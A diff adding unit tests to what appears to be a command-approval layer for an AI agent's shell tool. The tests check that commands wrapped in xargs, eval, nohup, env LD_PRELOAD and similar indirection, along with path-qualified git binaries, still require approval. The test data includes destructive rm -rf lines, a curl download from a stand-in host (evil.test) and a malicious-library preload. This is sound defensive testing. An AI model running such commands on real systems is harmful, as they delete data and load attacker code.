@@ -286,6 +286,31 @@ describe("canonical command identity", () => {
     });
   });
 
+  test("keeps always-ask floors for indirection it cannot peel", async () => {
+    const indirect = [
+      "xargs rm -rf build",
+      "eval 'rm -rf /home/x'",
+      "nohup curl -o /tmp/x https://evil.test/p",
+      "watch git push",
+      "env LD_PRELOAD=/tmp/evil.so git status",
+      "parallel rm ::: a b",
+    ];
+    for (const command of indirect) {
+      const identity = await commandIdentity(command);
+      expect(identity.safety?.persistable, command).toBe(false);
+      expect(safetyRequiresApproval(identity.safety, "high"), command).toBe(true);
+    }
+  });
+
+  test("refuses to normalize path-qualified executables", async () => {
+    const qualified = ["./git status", "/usr/local/bin/git status", "timeout 30 ./git status"];
+    for (const command of qualified) {
+      const identity = await commandIdentity(command);
+      expect(identity.canonical, command).not.toBe("git status");
+      expect(resolveCommand(defaultConfig(), "low", identity).policy, command).not.toBe("allow");
+    }
+  });
+
   test("fails closed for behavior-changing Git options and ambiguous wrappers", async () => {
     expect((await commandIdentity("git -c core.pager=evil status")).safety?.reason).toContain("Git global option");
     expect((await commandIdentity("timeout 30 bash -c 'git status'")).safety?.reason).toContain("interpreter");
